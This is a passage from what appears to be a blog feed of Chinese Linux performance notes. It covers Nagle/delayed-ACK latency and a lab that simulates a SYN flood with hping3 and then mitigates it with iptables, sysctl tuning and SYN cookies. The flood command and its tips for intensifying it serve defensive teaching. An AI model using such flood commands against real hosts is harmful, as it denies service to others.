class="hljs-comment">//192.168.0.30:8080/</span><br>...<br><span class="hljs-function"><span class="hljs-title">setsockopt</span><span class="hljs-params">(<span class="hljs-number">52</span>, SOL_TCP, TCP_NODELAY, [<span class="hljs-number">1</span>], <span class="hljs-number">4</span>)</span></span> = <span class="hljs-number">0</span><br>...<br><br></code></pre></td></tr></table></figure><p>可以看到，wrk 只设置了 TCP_NODELAY 选项，而没有设置 TCP_QUICKACK。这说明 wrk 采用的正是延迟确认，也就解释了上面这个40ms 的问题。</p><p>不过，别忘了，这只是客户端的行为，按理来说，Nginx 服务器不应该受到这个行为的影响。那是不是我们分析网络包时，漏掉了什么线索呢？让我们回到 Wireshark 重新观察一下。</p><p><img src="https://static001.geekbang.org/resource/image/72/8a/72eb14e8996147a458aa6523110c938a.png?wh=750*268" alt="img"></p><p>仔细观察 Wireshark 的界面，其中， 1173 号包，就是刚才说到的延迟 ACK 包；下一行的 1175 ，则是 Nginx 发送的第二个分组包，它跟 697 号包组合起来，构成一个完整的 HTTP 响应（ACK 号都是 85）。</p><p>第二个分组没跟前一个分组（697 号）一起发送，而是等到客户端对第一个分组的 ACK 后（1173 号）才发送，这看起来跟延迟确认有点像，只不过，这儿不再是 ACK，而是发送数据。</p><p>基于这个机制，我们可以怀疑这里用到了Nagle 算法，关于Nagle 算法是 TCP 协议中用于减少小包发送数量的一种优化算法，目的是为了提高实际带宽的利用率。</p><p>举个例子，当有效负载只有 1 字节时，再加上 TCP 头部和 IP 头部分别占用的 20 字节，整个网络包就是 41 字节，这样实际带宽的利用率只有 2.4%（1&#x2F;41）。往大了说，如果整个网络带宽都被这种小包占满，那整个网络的有效利用率就太低了。</p><p>Nagle 算法正是为了解决这个问题。它通过合并 TCP 小包，提高网络带宽的利用率。Nagle 算法规定，一个 TCP 连接上，最多只能有一个未被确认的未完成分组；在收到这个分组的 ACK 前，不发送其他分组。这些小分组会被组合起来，并在收到 ACK 后，用同一个分组发送出去。</p><p>显然，Nagle 算法本身的想法还是挺好的，但是知道 Linux 默认的延迟确认机制后，你应该就不这么想了。因为它们一起使用时，网络延迟会明显。如下图所示：</p><p><img src="https://static001.geekbang.org/resource/image/c5/c6/c51439692921cbf67b746a45fded2ec6.png?wh=672*934" alt="img"></p><ul><li><p>当 Sever 发送了第一个分组后，由于 Client 开启了延迟确认，就需要等待 40ms 后才会回复 ACK。</p></li><li><p>同时，由于 Server 端开启了 Nagle，而这时还没收到第一个分组的 ACK，Server 也会在这里一直等着。</p></li><li><p>直到 40ms 超时后，Client 才会回复ACK，然后，Server 才会继续发送第二个分组。</p></li></ul><p>既然可能是 Nagle 的问题，那该怎么知道，案例 Nginx 有没有开启 Nagle 呢？</p><p>查询 tcp 的文档，只有设置了 TCP_NODELAY 后，Nagle 算法才会禁用。所以，我们只需要查看 Nginx 的 tcp_nodelay 选项就可以了。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">TCP_NODELAY<br>              <span class="hljs-keyword">If</span> <span class="hljs-keyword">set</span>, <span class="hljs-keyword">disable</span> the Nagle algorithm.  This means that segments are <span class="hljs-keyword">always</span> sent <span class="hljs-keyword">as</span> soon <span class="hljs-keyword">as</span> possible, even<br>              <span class="hljs-keyword">if</span> there <span class="hljs-keyword">is</span> <span class="hljs-keyword">only</span> a small amount <span class="hljs-keyword">of</span> data.  <span class="hljs-keyword">When</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">set</span>, data <span class="hljs-keyword">is</span> buffered <span class="hljs-keyword">until</span>  there  <span class="hljs-keyword">is</span>  a  sufficient<br>              amount  <span class="hljs-keyword">to</span>  send <span class="hljs-keyword">out</span>, thereby avoiding the frequent sending <span class="hljs-keyword">of</span> small packets, which results <span class="hljs-keyword">in</span> poor uti‐<br>              lization <span class="hljs-keyword">of</span> the network.  This <span class="hljs-keyword">option</span> <span class="hljs-keyword">is</span> overridden <span class="hljs-keyword">by</span> TCP_CORK; however, setting this <span class="hljs-keyword">option</span> forces  an<br>              explicit flush <span class="hljs-keyword">of</span> pending output, even <span class="hljs-keyword">if</span> TCP_CORK <span class="hljs-keyword">is</span> currently <span class="hljs-keyword">set</span>.<br><br></code></pre></td></tr></table></figure><p>我们回到终端一中，执行下面的命令，查看案例 Nginx 的配置:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> nginx <span class="hljs-built_in">cat</span> /etc/nginx/nginx.conf | grep tcp_nodelay</span><br>    tcp_nodelay    off;<br><br></code></pre></td></tr></table></figure><p>果然，可以看到，案例 Nginx 的 tcp_nodelay 是关闭的，将其设置为 on 后再重新进行测试。</p><p>接着，切换到终端二，重新执行 wrk 测试延迟：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ wrk --latency -c 100 -t 2 --<span class="hljs-built_in">timeout</span> 2 http://192.168.0.30:8080/<br>Running 10s <span class="hljs-built_in">test</span> @ http://192.168.0.30:8080/<br>  2 threads and 100 connections<br>  Thread Stats   Avg      Stdev     Max   +/- Stdev<br>    Latency     9.58ms   14.98ms 350.08ms   97.91%<br>    Req/Sec     6.22k   282.13     6.93k    68.50%<br>  Latency Distribution<br>     50%    7.78ms<br>     75%    8.20ms<br>     90%    9.02ms<br>     99%   73.14ms<br>  123990 requests <span class="hljs-keyword">in</span> 10.01s, 100.50MB <span class="hljs-built_in">read</span><br>Requests/sec:  12384.04<br>Transfer/sec:     10.04MB<br><br></code></pre></td></tr></table></figure><p>果然，现在延迟已经缩短成了 9ms，跟我们测试的官方 Nginx 镜像是一样的（Nginx 默认就是开启 tcp_nodelay 的） 。</p><p>作为对比，我们用 tcpdump ，抓取优化后的网络包（这儿实际上抓取的是官方 Nginx 监听的 80 端口）。结果如下：</p><p><img src="https://static001.geekbang.org/resource/image/b5/ba/b5f1643cdca33f29408881542fca4eba.png?wh=1599*621" alt="img"></p><p>从图中可以发现，由于 Nginx 不用再等 ACK，536 和 540 两个分组是连续发送的；而客户端呢，虽然仍开启了延迟确认，但这时收到了两个需要回复 ACK 的包，所以也不用等 40ms，可以直接合并回复 ACK。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章讲解了网络延迟增大后的分析方法。网络延迟，是最核心的网络性能指标。由于网络传输、网络包处理等各种因素的影响，网络延迟不可避免。但过大的网络延迟，会直接影响用户的体验。</p><p>所以，在发现网络延迟增大后，可以用 traceroute、hping3、tcpdump、Wireshark、strace 等多种工具，来定位网络中的潜在问题。比如，</p><ul><li><p>使用 hping3 以及 wrk 等工具，确认单次请求和并发请求情况的网络延迟是否正常。</p></li><li><p>使用 traceroute，确认路由是否正确，并查看路由中每一跳网关的延迟。</p></li><li><p>使用 tcpdump 和 Wireshark，确认网络包的收发是否正常。</p></li><li><p>使用 strace 等，观察应用程序对网络套接字的调用情况是否正常。</p></li></ul><p>这样，就可以依次从路由、网络包的收发、再到应用程序等，逐层排查，直到定位问题根源。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>笔记</tag>
      
      <tag>linux</tag>
      
      <tag>网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>7.怎么缓解DDoS攻击带来的性能下降问题？</title>
    <link href="/2022/11/09/7-%E6%80%8E%E4%B9%88%E7%BC%93%E8%A7%A3DDoS%E6%94%BB%E5%87%BB%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%80%A7%E8%83%BD%E4%B8%8B%E9%99%8D%E9%97%AE%E9%A2%98%EF%BC%9F/"/>
    <url>/2022/11/09/7-%E6%80%8E%E4%B9%88%E7%BC%93%E8%A7%A3DDoS%E6%94%BB%E5%87%BB%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%80%A7%E8%83%BD%E4%B8%8B%E9%99%8D%E9%97%AE%E9%A2%98%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="7-怎么缓解-DDoS-攻击带来的性能下降问题？"><a href="#7-怎么缓解-DDoS-攻击带来的性能下降问题？" class="headerlink" title="7.怎么缓解 DDoS 攻击带来的性能下降问题？"></a>7.怎么缓解 DDoS 攻击带来的性能下降问题？</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">&gt; 本文笔记来自：「极客时间  Linux 性能优化实战」，原文链接：https:<span class="hljs-regexp">//</span>time.geekbang.org<span class="hljs-regexp">/column/</span>article/<span class="hljs-number">80898</span><br></code></pre></td></tr></table></figure><h2 id="DDoS-简介"><a href="#DDoS-简介" class="headerlink" title="DDoS 简介"></a>DDoS 简介</h2><p>DDoS 的前身是 DoS（Denail of Service），即拒绝服务攻击，指利用大量的合理请求，来占用过多的目标资源，从而使目标服务无法响应正常请求。</p><p>DDoS（Distributed Denial of Service） 则是在 DoS 的基础上，采用了分布式架构，利用多台主机同时攻击目标主机。这样，即使目标服务部署了网络防御设备，面对大量网络请求时，还是无力应对。</p><p>比如，目前已知的最大流量攻击，正是去年 Github 遭受的 <a href="https://githubengineering.com/ddos-incident-report/">DDoS 攻击</a>，其峰值流量已经达到了 1.35Tbps，PPS 更是超过了 1.2 亿（126.9 million）。</p><p>从攻击的原理上来看，DDoS 可以分为下面几种类型。</p><p>第一种，耗尽带宽。无论是服务器还是路由器、交换机等网络设备，带宽都有固定的上限。带宽耗尽后，就会发生网络拥堵，从而无法传输其他正常的网络报文。</p><p>第二种，耗尽操作系统的资源。网络服务的正常运行，都需要一定的系统资源，像是CPU、内存等物理资源，以及连接表等软件资源。一旦资源耗尽，系统就不能处理其他正常的网络连接。</p><p>第三种，消耗应用程序的运行资源。应用程序的运行，通常还需要跟其他的资源或系统交互。如果应用程序一直忙于处理无效请求，也会导致正常请求的处理变慢，甚至得不到响应。</p><p>比如，构造大量不同的域名来攻击 DNS 服务器，就会导致 DNS 服务器不停执行迭代查询，并更新缓存。这会极大地消耗 DNS 服务器的资源，使 DNS 的响应变慢。</p><p>无论是哪一种类型的 DDoS，危害都是巨大的。那么，如何可以发现系统遭受了 DDoS 攻击，又该如何应对这种攻击呢？</p><p>接下来，通过一个案例，一起来看看这些问题。</p><h2 id="案例准备"><a href="#案例准备" class="headerlink" title="案例准备"></a>案例准备</h2><p>下面的案例仍然基于 Ubuntu 18.04，同样适用于其他的 Linux 系统。环境如下：</p><ul><li><p>机器配置：2 CPU，8GB 内存。</p></li><li><p>预先安装 docker、sar 、hping3、tcpdump、curl 等工具，比如 apt-get install docker.io hping3 tcpdump curl。</p></li></ul><p>hping3 可以构造 TCP&#x2F;IP 协议数据包，对系统进行安全审计、防火墙测试、DoS 攻击测试等。</p><p>本次案例用到三台虚拟机，关系图如下：</p><p><img src="https://static001.geekbang.org/resource/image/d6/12/d64dd4603a4bd90d110f382d313d8c12.png?wh=826*720" alt="img"></p><p>可以看到，其中一台虚拟机运行 Nginx ，用来模拟待分析的 Web 服务器；而另外两台作为 Web 服务器的客户端，其中一台用作 DoS 攻击，而另一台则是正常的客户端。使用多台虚拟机的目的，自然还是为了相互隔离，避免“交叉感染”。</p><blockquote><p>由于案例只使用了一台机器作为攻击源，所以这里的攻击，实际上还是传统的 DoS ，而非 DDoS。</p></blockquote><p>接下来，我们打开三个终端，分别 SSH 登录到三台机器上（下面的步骤，都假设终端编号与图示VM 编号一致），并安装上面提到的这些工具。</p><p>同以前的案例一样，下面的所有命令，都默认以 root 用户运行。如果你是用普通用户身份登陆系统，请运行 sudo su root 命令切换到 root 用户。</p><p>接下来，我们就进入到案例操作环节。</p><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p>首先，在终端一中，执行下面的命令运行启动一个最基本的 Nginx 应用：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 运行Nginx服务并对外开放80端口</span><br><span class="hljs-comment"># --network=host表示使用主机网络（这是为了方便后面排查问题）</span><br>$ docker <span class="hljs-built_in">run</span> -itd <span class="hljs-attribute">--name</span>=nginx <span class="hljs-attribute">--network</span>=host nginx<br><br></code></pre></td></tr></table></figure><p>然后，在终端二和终端三中，使用 curl 访问 Nginx 监听的端口，确认 Nginx 正常启动。假设 192.168.0.30 是 Nginx 所在虚拟机的 IP 地址，那么运行 curl 命令后，会出现如下数据：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># -w表示只输出HTTP状态码及总时间，-o表示将响应重定向到<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span><br>$ curl -s -w <span class="hljs-string">&#x27;Http code: %&#123;http_code&#125;\nTotal time:%&#123;time_total&#125;s\n&#x27;</span> -o <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> http:<span class="hljs-comment">//192.168.0.30/</span><br>...<br>Http code: <span class="hljs-number">200</span><br>Total time:<span class="hljs-number">0.002</span>s<br><br></code></pre></td></tr></table></figure><p>从这里可以看到，正常情况下，访问 Nginx 只需要 2ms（0.002s）。</p><p>接着，在终端二中，运行 hping3 命令，来模拟 DoS 攻击：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-comment"># -S参数表示设置TCP协议的SYN（同步序列号），-p表示目的端口为80</span><br><span class="hljs-comment"># -i u10表示每隔10微秒发送一个网络帧</span><br><span class="hljs-variable">$ </span>hping3 -S -p <span class="hljs-number">80</span> -i u10 <span class="hljs-number">192.168</span>.<span class="hljs-number">0.30</span><br><br></code></pre></td></tr></table></figure><p>现在，再回到终端一，你就会发现，现在不管执行什么命令，都慢了很多。不过，在实践时要注意：</p><ul><li><p>如果你的现象不那么明显，那么请尝试把参数里面的 u10 调小（比如调成 u1），或者加上–flood选项；</p></li><li><p>如果你的终端一完全没有响应了，那么请适当调大 u10（比如调成 u30），否则后面就不能通过 SSH 操作 VM1。</p></li></ul><p>然后，到终端三中，执行下面的命令，模拟正常客户端的连接：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-meta"># --connect-timeout表示连接超时时间</span><br>$ curl -w &#x27;Http <span class="hljs-built_in">code</span>: %&#123;http_code&#125;\nTotal <span class="hljs-built_in">time</span>:%&#123;time_total&#125;s\n&#x27; -o /dev/<span class="hljs-built_in">null</span> --connect-timeout <span class="hljs-number">10</span> http:<span class="hljs-comment">//192.168.0.30</span><br>...<br>Http <span class="hljs-built_in">code</span>: <span class="hljs-number">000</span><br>Total <span class="hljs-built_in">time</span>:<span class="hljs-number">10.001</span>s<br>curl: (<span class="hljs-number">28</span>) Connection timed out after <span class="hljs-number">10000</span> milliseconds<br><br></code></pre></td></tr></table></figure><p>可以发现，在终端三中，正常客户端的连接超时了，并没有收到 Nginx 服务的响应。</p><p>这是发生了什么问题呢？再回到终端一中，检查网络状况。这里使用 sar命令，它既可以观察 PPS（每秒收发的报文数），还可以观察 BPS（每秒收发的字节数）。</p><p>回到终端一中，执行下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sar -n DEV 1<br>08:55:49        IFACE   rxpck/s   txpck/s    rxkB/s    txkB/s   rxcmp/s   txcmp/s  rxmcst/s   %ifutil<br>08:55:50      docker0      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00<br>08:55:50         eth0  22274.00    629.00   1174.64     37.78      0.00      0.00      0.00      0.02<br>08:55:50           lo      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00<br><br></code></pre></td></tr></table></figure><p>关于 sar 输出中的各列含义，可以点击 <a href="https://time.geekbang.org/column/article/81057">这里</a> 查看，或者执行 man sar 查询手册。</p><p>从这次 sar 的输出中，你可以看到，网络接收的 PPS 已经达到了 20000 多，但是 BPS 却只有 1174 kB，这样每个包的大小就只有 54B（1174*1024&#x2F;22274&#x3D;54）。</p><p>这明显就是个小包了，不过具体是个什么样的包呢？那我们就用 tcpdump 抓包看看吧。</p><p>在终端一中，执行下面的 tcpdump 命令：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns"># -i eth0 只抓取eth0网卡，-n不解析协议名和主机名<br># tcp port <span class="hljs-number">80</span>表示只抓取tcp协议并且端口号为<span class="hljs-number">80</span>的网络帧<br>$ tcpdump -i eth0 -n tcp port <span class="hljs-number">80</span><br><span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">48.287047</span> IP <span class="hljs-number">192.168.0.2</span>.<span class="hljs-number">27095</span> &gt; <span class="hljs-number">192.168.0.30</span>: Flags [S], seq <span class="hljs-number">1288268370</span>, win <span class="hljs-number">512</span>, length <span class="hljs-number">0</span><br><span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">48.287050</span> IP <span class="hljs-number">192.168.0.2</span>.<span class="hljs-number">27131</span> &gt; <span class="hljs-number">192.168.0.30</span>: Flags [S], seq <span class="hljs-number">2084255254</span>, win <span class="hljs-number">512</span>, length <span class="hljs-number">0</span><br><span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">48.287052</span> IP <span class="hljs-number">192.168.0.2</span>.<span class="hljs-number">27116</span> &gt; <span class="hljs-number">192.168.0.30</span>: Flags [S], seq <span class="hljs-number">677393791</span>, win <span class="hljs-number">512</span>, length <span class="hljs-number">0</span><br><span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">48.287055</span> IP <span class="hljs-number">192.168.0.2</span>.<span class="hljs-number">27141</span> &gt; <span class="hljs-number">192.168.0.30</span>: Flags [S], seq <span class="hljs-number">1276451587</span>, win <span class="hljs-number">512</span>, length <span class="hljs-number">0</span><br><span class="hljs-number">09</span>:<span class="hljs-number">15</span>:<span class="hljs-number">48.287068</span> IP <span class="hljs-number">192.168.0.2</span>.<span class="hljs-number">27154</span> &gt; <span class="hljs-number">192.168.0.30</span>: Flags [S], seq <span class="hljs-number">1851495339</span>, win <span class="hljs-number">512</span>, length <span class="hljs-number">0</span><br>...<br><br></code></pre></td></tr></table></figure><p>这个输出中，Flags [S] 表示这是一个 SYN 包。大量的 SYN 包表明，这是一个 SYN Flood 攻击。</p><p>通过 Wireshark 来观察，可以更直观地看到 SYN Flood 的过程：</p><p><img src="https://static001.geekbang.org/resource/image/f3/13/f397305c87be6ae43e065d3262ec9113.png?wh=1048*574" alt="img"></p><p>实际上，SYN Flood 正是互联网中最经典的 DDoS 攻击方式。从上面这个图，你也可以看到它的原理：</p><ul><li><p>即客户端构造大量的 SYN 包，请求建立 TCP 连接；</p></li><li><p>而服务器收到包后，会向源 IP 发送 SYN+ACK 报文，并等待三次握手的最后一次ACK报文，直到超时。</p></li></ul><p>这种等待状态的 TCP 连接，通常也称为半开连接。由于连接表的大小有限，大量的半开连接就会导致连接表迅速占满，从而无法建立新的 TCP 连接。</p><p>参考下面这张 TCP 状态图，此时，服务器端的 TCP 连接，会处于 SYN_RECEIVED 状态：</p><p><img src="https://static001.geekbang.org/resource/image/86/a2/86dabf9cc66b29133fa6a239cfee38a2.png?wh=796*600" alt="img"></p><p>（图片来自 <a href="https://en.wikipedia.org/wiki/File:Tcp_state_diagram.png">Wikipedia</a>）</p><p>这其实提示了我们，查看 TCP 半开连接的方法，关键在于 SYN_RECEIVED 状态的连接。我们可以使用 netstat ，来查看所有连接的状态，不过要注意，SYN_REVEIVED 的状态，通常被缩写为 SYN_RECV。</p><p>继续在终端一中，执行下面的 netstat 命令：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-comment"># -n表示不解析名字，-p表示显示连接所属进程</span><br>$ netstat -n -p | grep SYN_REC<br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>192.168.0.30:80          192.168.0.2:12503      SYN_RECV    -<br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>192.168.0.30:80          192.168.0.2:13502      SYN_RECV    -<br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>192.168.0.30:80          192.168.0.2:15256      SYN_RECV    -<br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>192.168.0.30:80          192.168.0.2:18117      SYN_RECV    -<br>...<br><br></code></pre></td></tr></table></figure><p>从结果中，可以发现大量 SYN_RECV 状态的连接，并且源IP地址为 192.168.0.2。</p><p>进一步，我们还可以通过 wc 工具，来统计所有 SYN_RECV 状态的连接数：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">$ netstat -n -p | <span class="hljs-type">grep</span> SYN_REC | <span class="hljs-type">wc</span> -l<br><span class="hljs-number">193</span><br><br></code></pre></td></tr></table></figure><p>找出源 IP 后，要解决 SYN 攻击的问题，只要丢掉相关的包就可以。这时，iptables 可以帮你完成这个任务。在终端一中，执行下面的 iptables 命令：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">$ iptables -I <span class="hljs-literal">INPUT</span> -s <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span> -p tcp -j REJECT<br><br></code></pre></td></tr></table></figure><p>然后回到终端三中，再次执行 curl 命令，查看正常用户访问 Nginx 的情况：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">$ curl -w &#x27;Http <span class="hljs-built_in">code</span>: %&#123;http_code&#125;\nTotal <span class="hljs-built_in">time</span>:%&#123;time_total&#125;s\n&#x27; -o /dev/<span class="hljs-built_in">null</span> --connect-timeout <span class="hljs-number">10</span> http:<span class="hljs-comment">//192.168.0.30</span><br>Http <span class="hljs-built_in">code</span>: <span class="hljs-number">200</span><br>Total <span class="hljs-built_in">time</span>:<span class="hljs-number">1.572171</span>s<br><br></code></pre></td></tr></table></figure><p>现在，正常用户也可以访问 Nginx 了，只是响应比较慢，从原来的 2ms 变成了现在的 1.5s。</p><p>不过，一般来说，SYN Flood 攻击中的源 IP 并不是固定的。比如，可以在 hping3 命令中，加入 –rand-source 选项，来随机化源 IP。这时，刚才的方法就不适用了。</p><p>幸好，我们还有很多其他方法，实现类似的目标。比如，可以用以下两种方法，来限制 syn 包的速率：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 限制syn并发数为每秒1次</span><br>$ <span class="hljs-string">iptables</span> -<span class="hljs-string">A</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">p</span> <span class="hljs-string">tcp</span> <span class="hljs-built_in">--syn</span> -<span class="hljs-string">m</span> <span class="hljs-string">limit</span> <span class="hljs-built_in">--limit</span> <span class="hljs-string">1</span>/<span class="hljs-string">s</span> -<span class="hljs-string">j</span> <span class="hljs-string">ACCEPT</span><br><br><span class="hljs-comment"># 限制单个IP在60秒新建立的连接数为10</span><br>$ <span class="hljs-string">iptables</span> -<span class="hljs-string">I</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">p</span> <span class="hljs-string">tcp</span> <span class="hljs-built_in">--dport</span> <span class="hljs-string">80</span> <span class="hljs-built_in">--syn</span> -<span class="hljs-string">m</span> <span class="hljs-string">recent</span> <span class="hljs-built_in">--name</span> <span class="hljs-string">SYN_FLOOD</span> <span class="hljs-built_in">--update</span> <span class="hljs-built_in">--seconds</span> <span class="hljs-string">60</span> <span class="hljs-built_in">--hitcount</span> <span class="hljs-string">10</span> -<span class="hljs-string">j</span> <span class="hljs-string">REJECT</span><br><br></code></pre></td></tr></table></figure><p>到这里，我们已经初步限制了 SYN Flood 攻击。不过这还不够，因为我们的案例还只是单个的攻击源。</p><p>如果是多台机器同时发送 SYN Flood，这种方法可能就直接无效了。因为很可能无法 SSH 登录（SSH 也是基于 TCP 的）到机器上去，更别提执行上述所有的排查命令。</p><p>所以，这还需要事先对系统做一些 TCP 优化。</p><p>比如，SYN Flood 会导致 SYN_RECV 状态的连接急剧增大。在上面的 netstat 命令中，你也可以看到 190 多个处于半开状态的连接。</p><p>不过，半开状态的连接数是有限制的，执行下面的命令，就可以看到，默认的半连接容量只有 256：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sysctl net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_max_syn_backlog</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_max_syn_backlog</span> = <span class="hljs-number">256</span><br><br></code></pre></td></tr></table></figure><p>换句话说， SYN 包数再稍微增大一些，就不能 SSH 登录机器了。 所以，还应该增大半连接的容量，可以用下面的命令，将其增大为 1024：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sysctl -w net<span class="hljs-selector-class">.ipv4</span>.tcp_max_syn_backlog=<span class="hljs-number">1024</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_max_syn_backlog</span> = <span class="hljs-number">1024</span><br><br></code></pre></td></tr></table></figure><p>另外，连接每个 SYN_RECV 时，如果失败的话，内核还会自动重试，并且默认的重试次数是5次。可以执行下面的命令，将其减小为 1 次：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sysctl -w net<span class="hljs-selector-class">.ipv4</span>.tcp_synack_retries=<span class="hljs-number">1</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_synack_retries</span> = <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>除此之外，<strong>TCP SYN Cookies</strong> 也是一种专门防御 SYN Flood 攻击的方法。SYN Cookies 基于连接信息（包括源地址、源端口、目的地址、目的端口等）以及一个加密种子（如系统启动时间），计算出一个哈希值（SHA1），这个哈希值称为 cookie。</p><p>然后，这个 cookie 就被用作序列号，来应答 SYN+ACK 包，并释放连接状态。当客户端发送完三次握手的最后一次 ACK 后，服务器就会再次计算这个哈希值，确认是上次返回的 SYN+ACK 的返回包，才会进入 TCP 的连接状态。</p><p>因而，开启 SYN Cookies 后，就不需要维护半开连接状态了，进而也就没有了半连接数的限制。</p><blockquote><p>注意，开启 TCP syncookies 后，内核选项 net.ipv4.tcp_max_syn_backlog 也就无效了。</p></blockquote><p>可以通过下面的命令，开启 TCP SYN Cookies：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ sysctl -w net<span class="hljs-selector-class">.ipv4</span>.tcp_syncookies=<span class="hljs-number">1</span><br>net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_syncookies</span> = <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>注意，上述 sysctl 命令修改的配置都是临时的，重启后这些配置就会丢失。所以，为了保证配置持久化，还应该把这些配置，写入 &#x2F;etc&#x2F;sysctl.conf 文件中。比如：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ cat /etc/sysctl<span class="hljs-selector-class">.conf</span><br>net<span class="hljs-selector-class">.ipv4</span><span 